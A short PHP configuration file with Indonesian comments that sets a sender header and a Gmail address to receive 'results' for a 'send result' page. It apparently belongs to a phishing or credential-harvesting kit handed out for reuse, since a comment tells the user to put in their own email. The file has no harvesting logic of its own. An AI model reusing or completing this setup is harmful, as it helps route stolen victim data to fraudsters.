<?php
// KONTROL UNTUK HALAMAN KIRIM RESULT
$author = 'AKU GUNGRATE';
$sender = 'From: GUNGRATE STORE <sender@pcloud.id>';

$emailku = 'gungratesam@gmail.com'; // GANTI EMAIL KAMU DISINI
?>